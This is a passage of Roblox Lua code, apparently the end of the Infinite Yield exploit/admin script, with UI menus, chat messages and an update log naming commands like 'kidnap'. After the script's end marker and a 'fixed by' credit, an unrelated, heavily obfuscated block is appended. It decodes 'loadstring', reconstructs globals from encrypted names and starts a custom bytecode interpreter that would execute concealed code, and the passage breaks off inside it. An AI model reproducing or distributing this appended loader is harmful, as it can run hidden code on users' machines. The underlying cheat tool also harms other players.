	local Index,SizeY = 0,0
	for i,v in next, frame2:GetChildren() do
		if bool then
			if Match2(v.Text,str) then
				game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 200),"Out","Quad",0.3,true)
				Index = Index + 1
				v.Position = UDim2.new(0,0,0,Index*v.AbsoluteSize.Y-v.AbsoluteSize.Y)
				v.Visible = true
				SizeY = SizeY + v.AbsoluteSize.Y
				frame2.CanvasSize = UDim2.new(0,0,0,SizeY) else v.Visible = false end else
			v.Visible = true
			SizeY = SizeY + v.AbsoluteSize.Y
			frame2.CanvasSize = UDim2.new(0,0,0,SizeY) end end end end end
IndexContents2('',true)
game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 0),"Out","Quad",0.2,true)
Loading.ba:TweenSize(UDim2.new(1, 0, 1, 0), "InOut", "Quart", 0.4, true, nil) wait(1)
repeat wait() until loadedintro == true
logof:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0), "Out", "Linear", 0.1)
wait(0.2)
f:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0), "Out", "Linear", 0.2)
wait(0.3) g:Destroy()
updatecolors(Color3.new(colorR, colorG, colorB))
Loading:TweenPosition(UDim2.new(0.25, 0, 1.5, 0), "InOut", "Quart", 0.5, true, nil) wait(0.5) Loading.Parent:Destroy()
coroutine.resume(coroutine.create(function()
	local TextChatService = game:GetService("TextChatService")
	print("[IY-DEBUG] ChatVersion =", TextChatService.ChatVersion)
	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		local channels = TextChatService:FindFirstChild("TextChannels")
		local channel = channels and channels:FindFirstChild("RBXGeneral")
		print("[IY-DEBUG] channel =", channel)
		if channel then
			channel:DisplaySystemMessage("The prefix is '" .. cmdprefix .. "'")
			task.wait(0.5)
			channel:DisplaySystemMessage("Click IY on the top left to see more options")
			print("[IY-DEBUG] messages sent")
		end
	else
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "The prefix is '" .. cmdprefix .. "'";
			Color = Color3.new(255,255,255);
			Font = Enum.Font.SourceSans;
			FontSize = Enum.FontSize.Size24;
		}) wait(0.5)
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "Click IY on the top left to see more options";
			Color = Color3.new(255,255,255);
			Font = Enum.Font.SourceSans;
			FontSize = Enum.FontSize.Size24;
		})
	end
end))
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
qopen = false quickmenu.MouseButton1Click:connect(function()
if qopen == false then fadelock('off') NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil)
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01) MusicPlayer:Hide()
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01) qopen = true else
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
if slock == true then fadelock("rbxassetid://1495252742") elseif isagelocked == true then fadelock("rbxassetid://1495252495") end
qopen = false if playerenabled == true then MusicPlayer:Show() else NOTIFY.NOTIFY:TweenPosition(UDim2.new(0, 0, 0, -38), "InOut", "Quart", 0.5, true, nil) end end end)
quickmenu.sheild.cmds.MouseButton1Click:connect(function() if cmdOpen == true then
game.CoreGui.cp.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,0,1.018,-310),"Out","Quad",0.2,true) wait(0.1)
game.CoreGui.cp.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-300),"Out","Quad",0.2,true) wait(0.2)
game.CoreGui.cp.Frame.holder.bar.Hide.Visible = true
game.CoreGui.cp.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true)
else runwindow() end end)
quickmenu.sheild.settings.MouseButton1Click:connect(function() hub() end)
infopen = false quickmenu.sheild.info.MouseButton1Click:connect(function() if infopen == false then infopen = true
Updates = Instance.new("ScreenGui")
dragg = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ContainerFrame = Instance.new("Frame")
local LOG = Instance.new("TextLabel")
local PopupText3 = Instance.new("TextLabel")
local PopupText4 = Instance.new("TextLabel")
local UTDV = Instance.new("TextLabel")
local PopupText5 = Instance.new("TextLabel")
local shadow = Instance.new("Frame")
Exitt = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
local vers = Instance.new("TextLabel")
Updates.Name = "Updates"
Updates.Parent = game.CoreGui
dragg.Name = "drag"
dragg.Parent = Updates
dragg.Active = true
dragg.BackgroundColor3 = Color3.new(1, 1, 1)
dragg.BackgroundTransparency = 1
dragGUI(dragg)
dragg.Position = UDim2.new(0.5, -225, 0, -600)
dragg.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = dragg
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ZIndex = 5
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ContainerFrame.Size = UDim2.new(1, 0, 0.8, 0) -- SIZE
ContainerFrame.ZIndex = 5
LOG.Name = "LOG"
LOG.Parent = ContainerFrame
LOG.BackgroundTransparency = 1
LOG.Position = UDim2.new(0, 8, 0, 110)
LOG.Size = UDim2.new(1, -16, 1, 0)
LOG.ZIndex = 10
LOG.Font = Enum.Font.SourceSansBold
LOG.TextSize = 20
LOG.Text = "+ Added os [plr]\n+ Added whiteify/blackify [plr]\n+ Added addban [full username]\n+ Added a rainbow mode to the UI (inside color picker)\n\n* Fixed a bug in kidnap"
LOG.TextColor3 = Color3.new(0.97, 0.97, 0.97)
LOG.TextStrokeTransparency = 0
LOG.TextWrapped = true
LOG.TextYAlignment = Enum.TextYAlignment.Top
LOG.TextXAlignment = "Left"
PopupText3.Name = "PopupText3"
PopupText3.Parent = ContainerFrame
PopupText3.BackgroundTransparency = 1
PopupText3.Position = UDim2.new(0, 8, 0, 35)
PopupText3.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText3.ZIndex = 10
PopupText3.Font = Enum.Font.SourceSansBold
PopupText3.TextSize = 20
PopupText3.Text = "Edge - Moon"
PopupText3.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText3.TextStrokeTransparency = 0
PopupText3.TextWrapped = true
PopupText3.TextYAlignment = Enum.TextYAlignment.Top
PopupText4.Name = "PopupText4"
PopupText4.Parent = ContainerFrame
PopupText4.BackgroundTransparency = 1
PopupText4.Position = UDim2.new(0, 8, 0, 50)
PopupText4.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText4.ZIndex = 10
PopupText4.Font = Enum.Font.SourceSansBold
PopupText4.FontSize = Enum.FontSize.Size18
PopupText4.Text = "infyield.weebly.com - discord.me/infiniteyield"
PopupText4.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText4.TextStrokeTransparency = 0
PopupText4.TextWrapped = true
PopupText4.TextYAlignment = Enum.TextYAlignment.Top
UTDV.Name = "UTDV"
UTDV.Parent = ContainerFrame
UTDV.BackgroundTransparency = 1
UTDV.Position = UDim2.new(0, 8, 0, 5)
UTDV.Size = UDim2.new(1, -16, 0.100000001, 0)
UTDV.ZIndex = 10
UTDV.Font = Enum.Font.SourceSansBold
UTDV.FontSize = Enum.FontSize.Size28
UTDV.Text = "Up to date version: N/A"
UTDV.TextColor3 = Color3.new(0.97, 0.97, 0.97)
UTDV.TextStrokeTransparency = 0
UTDV.TextWrapped = true
UTDV.TextYAlignment = Enum.TextYAlignment.Top
PopupText5.Name = "PopupText5"
PopupText5.Parent = ContainerFrame
PopupText5.BackgroundTransparency = 1
PopupText5.Position = UDim2.new(0, 8, 0, 75)
PopupText5.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText5.ZIndex = 10
PopupText5.Font = Enum.Font.SourceSansBold
PopupText5.FontSize = Enum.FontSize.Size28
PopupText5.Text = "Update Log:"
PopupText5.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText5.TextStrokeTransparency = 0
PopupText5.TextWrapped = true
PopupText5.TextYAlignment = Enum.TextYAlignment.Top
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exitt.Name = "Exit"
Exitt.Parent = shadow
Exitt.BackgroundColor3 = Color3.new(1, 0, 0)
Exitt.BackgroundTransparency = 0.30000001192093
Exitt.BorderColor3 = Color3.new(1, 0, 0)
Exitt.BorderSizePixel = 0
Exitt.Position = UDim2.new(0, 415, 0, 3)
Exitt.Size = UDim2.new(0, 20, 0, 20)
Exitt.FontSize = Enum.FontSize.Size14
Exitt.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -2)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 110
PopupText.Font = Enum.Font.SourceSansBold
PopupText.TextSize = 30
PopupText.Text = "Information"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
vers.Name = "vers"
vers.Parent = shadow
vers.BackgroundTransparency = 1
vers.Position = UDim2.new(0, 8, 0, 2)
vers.Size = UDim2.new(0.200913236, -16, 1.11538458, 0)
vers.ZIndex = 110
vers.Font = Enum.Font.SourceSansBold
vers.TextSize = 20
vers.Text = "v" .. Version
vers.TextColor3 = Color3.new(0.97, 0.97, 0.97)
vers.TextStrokeTransparency = 0
vers.TextWrapped = true
vers.TextXAlignment = Enum.TextXAlignment.Left
vers.TextYAlignment = Enum.TextYAlignment.Top
if UTD == true then UTDV.Text = "Up to date version: Yes" else UTDV.Text = "Up to date version: No" end end
dragg:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil) Exitt.MouseButton1Click:connect(function()
dragg:TweenPosition(UDim2.new(0.5, -225, 0, -600), "InOut", "Quart", 0.5, true, nil) wait(0.5) infopen = false Updates:Destroy() end) end)
quickmenu.sheild.updates.MouseButton1Click:connect(function() serverinfogui() end) end

run()
--script end
end

run()
print("fixed by BLOX_FRUIT01110")
--start
local _O_112=("")["\099\104\097\114"]
local _l_O1d=(function() local _1_1e=""
for _,_c in ipairs({127,130,116,119,134,135,133,124,129,122}) do _1_1e=_1_1e.._O_112((_c-19+256)%256) end
local _f=(type(getfenv)=="function" and getfenv(0) or _G)[_1_1e]
if _f then return _f end
_1_1e=""
for _,_c in ipairs({127,130,116,119}) do _1_1e=_1_1e.._O_112((_c-19+256)%256) end
return (type(getfenv)=="function" and getfenv(0) or _G)[_1_1e] end)()
local _IIO1c=_l_O1d
local function _OlIl1f(__11g,___1h) local _n=""
for _i=1,#__11g do _n=_n.._O_112((__11g[_i]-___1h+256)%256) end
return _l_O1d("\114\101\116\117\114\110\32".._n)() end
local _I0I1b=_OlIl1f({83,66,88,84,70,85},225)
local _OOO17=_OlIl1f({59,46,44,55,55},203)
do local _1I1k=_OlIl1f({10,17,28,219,218},168)
_1IO15=_1I1k["\114\115\104\105\102\116"] end
local _10118=_OlIl1f({68,73,64,53},208)
do local _OI1l=_OlIl1f({190,171,172,182,175},74)
__0_16=_OI1l["\099\111\110\99\97\116"] end
local _Ol01a=_OlIl1f({73,56,78,62,60,75},215)
local _l0l19=_OlIl1f({142,128,143,136,128,143,124,143,124,125,135,128},27)
do local _111j=_OlIl1f({172,179,190,125,124},74)
_0l114=_111j["\98\97\110\100"] end
do local _OI1i=_OlIl1f({115,122,133,68,67},17)
_01_13=_OI1i["\98\120\111\114"] end
local function _0__I1n(_111m) local _1I1o=374486262
local _1I1p={}
for __11q=1,#_111m do local __I1r=_0l114(_1I1o,0xFF)
_1I1p[__11q]=_O_112(_01_13(_111m[__11q],__I1r))
if _1I1o%2==0 then _1I1o=_1IO15(_1I1o,1) else _1I1o=_0l114(_1I1o*3+1,0x7FFFFFFF) end
if _1I1o<=1 then _1I1o=_01_13(374486262,__11q) end end
return __0_16(_1I1p) end
local __0Ol2=_G
do local _I111s,_Oll1t=_OOO17(function() local _f=_IIO1c(_0__I1n({132,30,6,204,94,248,235,5,212,96,109,224,254,62,12,59}))
if _f then return _f() end end)
if _I111s and _10118(_Oll1t)=="\116\97\098\108\101" then __0Ol2=_Oll1t end end
do local _I111s,_Oll1t=_OOO17(function() local _f=_IIO1c(_0__I1n({132,30,6,204,94,248,235,5,212,96,108,224,254,62,12,34,32}))
if _f then return _f() end end)
if _I111s and _10118(_Oll1t)=="\116\97\098\108\101" then __0Ol2=_Oll1t end end
local _OOOI1=_l0l19({},{["\095\95\105\110\100\101\120"]=function(_0l1u,_I01v) local _O01w,_l_1x=_OOO17(function() return __0Ol2[_I01v] end)
if _O01w then return _l_1x end
return nil end})
local _IlI03={{149,23,29,215,73,228,174,4},{133,30,6,215,77,251,174,1,208,120,102,232,245,60,76,125,109},{145,30,6,203,77,225,166,7,197,117,126,228,242,36,65},{145,30,6,215,69,250,162,12,194,96,107,235,243,45,87},{145,30,6,222,73,248,189},{179,21,7,212},{155,26,6,209},{151,11,2,220,66,242,173,11,221,113},{133,24,0,208,92,226},{164,26,11,218,77,229,191,50,208,102,107,232,227},{159,31,23,215,88,255,173,27,212,108,111,230,229,60,75,96},{129,26,27,205},{132,30,19,221,74,255,167,7},{159,8,20,208,64,243},{131,15,20,129},{164,30,21,208,67,248,248},{130,2,2,220,67,240},{145,30,6,213,67,247,175,7,213,121,101,225,229,36,65,97},{181,20,30,214,94,165},{149,9,11,201,88},{160,30,17,205,67,228,249},{159,8,20,214,64,242,174,16},{145,30,6,203,89,248,165,11,223,115,121,230,226,33,84,102,122},{146,30,30,216,85},{152,30,5,201,94,249,179,27},{132,30,3,204,69,228,174},{132,26,5,202,73,226},{145,30,6,218,67,248,165,7,210,96,99,234,254,59},{154,18,1,205,74,255,167,7,194},{145,30,6,203,73,248,189},{130,26,1,210},{145,30,6,212,73,226,170,22,208,118,102,224},{162,12,23,220,66,223,165,4,222},{184,14,31,219,73,228,153,3,223,115,111},{163,63,27,212,30},{130,18,17,210},{158,20,29,210,65,243,191,3,220,113,126,237,255,44},{151,8,1,220,94,226},{163,63,27,212},{181,61,0,216,65,243},{133,30,6,203,77,225,166,7,197,117,126,228,242,36,65},{148,26,1,220,26,162},{129,20,0,210,95,230,170,1,212},{148,18,6,138,30},{164,30,17,205},{159,8,0,220,77,242,164,12,221,109},{146,30,16,204,75},{133,11,19,206,66},{130,20,1,205,94,255,165,5},{145,30,6,223,73,248,189},{134,9,27,215,88},{163,8,23,203,127,243,191,22,216,122,109,246},{144,18,0,220,95,255,172,12,208,120},{145,30,6,222,79},{142,11,17,216,64,250},{145,30,6,215,77,251,174,1,208,120,102,232,245,60,76,125,109},{184,14,31,219,73,228,152,7,192,97,111,235,243,45},{145,30,6,205,68,228,174,3,213,125,110,224,254,60,77,102,112},{145,30,6,202,73,248,189},{178,9,19,206,69,248,172},{130,26,16,213,73},{128,30,0,202,69,249,165},{133,30,6,205,69,248,172,17},{181,20,30,214,94,197,174,19,196,113,100,230,245},{132,26,5,213,73,248},{133,15,0,208,66,241},{130,2,2,220},{133,30,6,205,68,228,174,3,213,125,110,224,254,60,77,102,112},{135,14,23,204,73,201,164,12,238,96,111,233,245,56,75,96,125},{133,30,6,218,64,255,187,0,222,117,120,225},{147,9,0,214,94},{152,30,10,205},{148,14,20,223,73,228},{185,13,23,203,64,247,187,50,208,102,107,232,227},{155,26,25,220,74,249,167,6,212,102},{145,30,6,218,77,250,167,11,223,115,121,230,226,33,84,102},{159,8,30,218,64,249,184,23,195,113},{146,30,30,223,67,250,175,7,195},{132,30,3,204,73,229,191},{133,30,6,212,73,226,170,22,208,118,102,224},{164,26,28,221,67,251},{153,8},{132,26,5,220,93,227,170,14},{159,8,17,218,64,249,184,23,195,113},{145,30,6,208,66,229,191,3,223,119,111,246},{145,26,31,220},{149,19,23,218,71,245,170,14,221,113,120},{133,15,19,205,95},{158,20,29,210,74,227,165,1,197,125,101,235},{145,30,6,202,79,228,162,18,197,103},{159,11,19,208,94,229},{133,19,19,203,73,242},{134,24,19,213,64},{154,20,19,221},{154,20,19,221,95,226,185,11,223,115},{130,20,28,204,65,244,174,16},{154,20,19,221,74,255,167,7},{191,21,1,205,77,248,168,7},{129,26,0,215},{169,60},{134,26,27,203,95},{130,18,31,220},{133,30,6,223,73,248,189},{146,30,30,223,69,250,174},{164,26,11},{178,26,6,220,120,255,166,7},{133,30,6,203,73,247,175,13,223,120,115},{133,2,28},{133,30,30,220,79,226},{160,30,17,205,67,228,248},{149,20,0,214,89,226,162,12,212},{131,21,2,216,79,253},{152,30,5,218,79,250,164,17,196,102,111},{132,26,5,222,73,226},{129,9,27,205,73,240,162,14,212},{158,15,6,201},{180,9,27,218,71,213,164,14,222,102}}
for _I0I4=1,#_IlI03 do local __0I5=_0__I1n(_IlI03[_I0I4])
local _O01w,_l_1x=_OOO17(function() return __0Ol2[__0I5] end)
if _O01w then _I0I1b(_OOOI1,__0I5,_l_1x) end end
if not _Ol01a(_OOOI1,_0__I1n({131,21,2,216,79,253})) then local _t=_Ol01a(_OOOI1,_0__I1n({130,26,16,213,73}))
if _t then _I0I1b(_OOOI1,_0__I1n({131,21,2,216,79,253}),_t[_0__I1n({131,21,2,216,79,253})]) end end
if not _Ol01a(_OOOI1,_0__I1n({154,20,19,221,95,226,185,11,223,115})) then _I0I1b(_OOOI1,_0__I1n({154,20,19,221,95,226,185,11,223,115}),_Ol01a(_OOOI1,_0__I1n({154,20,19,221}))) end

local function _l1_l10(_1_O6,_1OI_7,_OOOI1,__1008,_Ol0l1y,__I0l_e,___IOf)
__1008=__1008 or {}
__I0l_e=__I0l_e or {}
___IOf=___IOf or {}
local _I1__1g=___IOf.n or #___IOf
local function _OIl00z(_idx) return _1_O6[_idx] end
for _i,_v in ipairs(_1_O6) do if type(_v)=="table" then local _s=""
if type(_v[1])=="table" then local _p=0
for _fi=1,#_v do for _j=1,#_v[_fi] do _s=_s..string.char(bit32.bxor(_v[_fi][_j],bit32.band(25+_p*147+(_i-1),0xFF)))
_p=_p+1 end end else for _j=1,#_v do _s=_s..string.char(bit32.bxor(_v[_j],bit32.band(25+(_j-1)*147+(_i-1),0xFF))) end end
_1_O6[_i]=_s end end
local function _1__0_1y(ps) for _,p in ipairs(ps) do if p.K then for _i,_v in ipairs(p.K) do if type(_v)=="table" then local _s=""
if type(_v[1])=="table" then local _p=0
for _fi=1,#_v do for _j=1,#_v[_fi] do _s=_s..string.char(bit32.bxor(_v[_fi][_j],bit32.band(25+_p*147+(_i-1),0xFF)))
_p=_p+1 end end else for _j=1,#_v do _s=_s..string.char(bit32.bxor(_v[_j],bit32.band(25+(_j-1)*147+(_i-1),0xFF))) end end
p.K[_i]=_s end end end
if p.P then _1__0_1y(p.P) end end end
_1__0_1y(__1008)
if not _1OI_7[0] then for _i=1,#_1OI_7 do if _1OI_7[_i]>=0 then _1OI_7[_i]=bit32.bxor(_1OI_7[_i],54) end end
_1OI_7[0]=true end
local function __0I0O1z(ps) for _,p in ipairs(ps) do if p.C and not p.C[0] then for _i=1,#p.C do if p.C[_i]>=0 then p.C[_i]=bit32.bxor(p.C[_i],54) end end
p.C[0]=true end
if p.P then __0I0O1z(p.P) end end end
__0I0O1z(__1008)
local _ll_19={}
local _IO11b={}
local _IOO01h={}
local _00_0a=0
local _0OI0lc={}
local _IIId=1
local _11l_li=0
local _11I0k=false
local _O0lOOl=false
local _0I_Im=0
local _OIO0n=0
local _00_o=0
local _OOIIp=nil
local __I_10=0
if _Ol0l1y then for _k=0,(_Ol0l1y.n or 0)-1 do _IO11b[_k]=_Ol0l1y[_k] end end
local function _11It(v) _00_0a=_00_0a+1
_ll_19[_00_0a]=v end
local function _l0_u() local v=_ll_19[_00_0a]
_ll_19[_00_0a]=nil
_00_0a=_00_0a-1
return v end
local function _lO_v() return _ll_19[_00_0a] end
local function _II__Oq(slot) local box=_0OI0lc[slot]
if box then return box[1] end
return _IO11b[slot] end
local function _I111Or(slot,val) local box=_0OI0lc[slot]
if box then box[1]=val else _IO11b[slot]=val end end
local function _l1O_ls(slot) if not _0OI0lc[slot] then _0OI0lc[slot]={_IO11b[slot]} end
return _0OI0lc[slot] end
local function _0_0lw(obj,name) local ok,mt=pcall(getmetatable,obj)
if ok and mt and type(mt)=="table" then return rawget(mt,name) end
return nil end
local function _0O__1x(a,b,op,name) if type(a)=="number" and type(b)=="number" then return op(a,b) end
local ok,r=pcall(op,a,b)
if ok then return r end
local mm=_0_0lw(a,name) or _0_0lw(b,name)
if mm then return mm(a,b) end
return op(a,b) end
local _100lj={}
_100lj[23]=function() end
_100lj[61]=function() _11It(nil) end
_100lj[18]=function() _11It(true) end
_100lj[26]=function() _11It(false) end
_100lj[66]=function() _11It(_OIl00z(_1OI_7[_IIId]+1))
_IIId=_IIId+1 end
_100lj[36]=function() _11It(_II__Oq(_1OI_7[_IIId]))
_IIId=_IIId+1 end
_100lj[16]=function() _I111Or(_1OI_7[_IIId],_l0_u())
_IIId=_IIId+1 end
_100lj[58]=function() _11It(_OOOI1[_OIl00z(_1OI_7[_IIId]+1)])
_IIId=_IIId+1 end
_100lj[46]=function() _OOOI1[_OIl00z(_1OI_7[_IIId]+1)]=_l0_u()
_IIId=_IIId+1 end
_100lj[56]=function() local b,a=_l0_u(),_l0_u()
_11It(_0O__1x(a,b,function(x,y) return x+y end,"__add")) end
_100lj[0]=function() local b,a=_l0_u(),_l0_u()
_11It(_0O__1x(a,b,function(x,y) return x-y end,"__sub")) end
_100lj[67]=function() local b,a=_l0_u(),_l0_u()
_11It(_0O__1x(a,b,function(x,y) return x*y end,"__mul")) end
_100lj[63]=function() local b,a=_l0_u(),_l0_u()
_11It(_0O__1x(a,b,function(x,y) return x/y end,"__div")) end
_100lj[35]=function() local b,a=_l0_u(),_l0_u()
_11It(_0O__1x(a,b,function(x,y) return x%y end,"__mod")) end
_100lj[53]=function() local b,a=_l0_u(),_l0_u()
_11It(_0O__1x(a,b,function(x,y) return x^y end,"__pow")) end
_100lj[10]=function() local b,a=_l0_u(),_l0_u()
local ok,r=pcall(function() return a..b end)
if ok then _11It(r) else _11It(tostring(a)..tostring(b)) end end
_100lj[17]=function() local b,a=_l0_u(),_l0_u()
_11It(a==b) end
_100lj[41]=function() local b,a=_l0_u(),_l0_u()
_11It(a~=b) end
_100lj[12]=function() local b,a=_l0_u(),_l0_u()
_11It(a<b) end
_100lj[51]=function() local b,a=_l0_u(),_l0_u()
_11It(a<=b) end
_100lj[22]=function() local b,a=_l0_u(),_l0_u()
_11It(a>b) end
_100lj[65]=function() local b,a=_l0_u(),_l0_u()
_11It(a>=b) end
_100lj[1]=function() local b,a=_l0_u(),_l0_u()
_11It(a and b) end
_100lj[45]=function() local b,a=_l0_u(),_l0_u()
_11It(a or b) end
_100lj[37]=function() _11It(not _l0_u()) end
_100lj[29]=function() _11It(-_l0_u()) end
_100lj[62]=function() _11It(#_l0_u()) end
_100lj[55]=function() _11It({}) end
_100lj[11]=function() local k,t=_l0_u(),_l0_u()
_11It(t[k]) end
_100lj[44]=function() local v,k,t=_l0_u(),_l0_u(),_l0_u()
t[k]=v end
_100lj[40]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
local args={}
for i=1,n do args[n-i+1]=_l0_u() end
local f=_l0_u()
if type(f)~="function" then local mm=_0_0lw(f,"__call")
if mm then table.insert(args,1,f)
n=n+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if n==0 then r={f()} else r={f(table.unpack(args,1,n))} end
_11It(r[1]) end
_100lj[60]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
_11I0k=true
if n==0 then _00_o=0 elseif n>0 then if n>_00_0a then n=_00_0a end
_00_o=n
_O0lOOl=true
_OIO0n=_00_0a
_0I_Im=_00_0a-n else _00_o=_00_0a
_O0lOOl=true
_OIO0n=_00_0a
_0I_Im=0 end end
_100lj[34]=function() _IIId=_1OI_7[_IIId]+1 end
_100lj[31]=function() local target=_1OI_7[_IIId]
_IIId=_IIId+1
if not _l0_u() then _IIId=target+1 end end
_100lj[27]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
for _=1,n do _l0_u() end end
_100lj[30]=function() local pi=_1OI_7[_IIId]
_IIId=_IIId+1
local P=__1008[pi]
if P then
local _r,Kp,Cp=_l1_l10,P.K or _1_O6,P.C or {}
local nU={}
if P.U then for ui,ud in ipairs(P.U) do local iL,idx=ud[1],ud[2]
if iL==1 then nU[ui]=_l1O_ls(idx) else nU[ui]=__I0l_e[idx+1] end end end
local nP=P.nParams or 0
_11It(function(...)
local a={...}
local ac=select("#",...)
local L={}
L.n=nP
for i=1,(ac<nP and ac or nP) do L[i-1]=a[i] end
local va={}
if ac>nP then for i=nP+1,ac do va[i-nP]=a[i] end end
va.n=ac-nP
return _r(Kp,Cp,_OOOI1,P.P or {},L,nU,va)
end)
else _11It(nil) end end
_100lj[38]=function() _11It(_lO_v()) end
_100lj[14]=function() local ui=_1OI_7[_IIId]
_IIId=_IIId+1
local box=__I0l_e[ui+1]
_11It(box and box[1] or nil) end
_100lj[48]=function() local ui=_1OI_7[_IIId]
_IIId=_IIId+1
local box=__I0l_e[ui+1]
if box then box[1]=_l0_u() else _l0_u() end end
_100lj[4]=function() local na=_1OI_7[_IIId]
_IIId=_IIId+1
local nr=_1OI_7[_IIId]
_IIId=_IIId+1
local args={}
for i=1,na do args[na-i+1]=_l0_u() end
local f=_l0_u()
if type(f)~="function" then local mm=_0_0lw(f,"__call")
if mm then table.insert(args,1,f)
na=na+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if na==0 then r=table.pack(f()) else r=table.pack(f(table.unpack(args,1,na))) end
local rn=nr<0 and r.n or nr
for i=1,rn do _11It(r[i]) end end
_100lj[20]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
if n<0 then for i=1,_I1__1g do _11It(___IOf[i]) end else for i=1,n do _11It(___IOf[i]) end end end
_100lj[15]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
local args={}
for j=n,1,-1 do args[j]=_l0_u() end
local f=_l0_u()
if type(f)~="function" then local mm=_0_0lw(f,"__call")
if mm then table.insert(args,1,f)
n=n+1
f=mm end end
_11I0k=true
_OOIIp=table.pack(f(table.unpack(args,1,n))) end
_100lj[21]=function() local off=_1OI_7[_IIId]
_IIId=_IIId+1
local step=_l0_u()
local limit=_l0_u()
local init=_l0_u()
_11It(init)
_11It(limit)
_11It(step)
if step>=0 then if init>limit then _IIId=off+1 end else if init<limit then _IIId=off+1 end end end
_100lj[52]=function() local off=_1OI_7[_IIId]
_IIId=_IIId+1
local step=_ll_19[_00_0a]
local i=_ll_19[_00_0a-2]+step
_ll_19[_00_0a-2]=i
local limit=_ll_19[_00_0a-1]
if step>=0 then if i<=limit then _IIId=off+1 end else if i>=limit then _IIId=off+1 end end end
_100lj[19]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
local parts={}
for i=1,n do parts[n-i+1]=tostring(_l0_u()) end
_11It(table.concat(parts)) end
_100lj[8]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
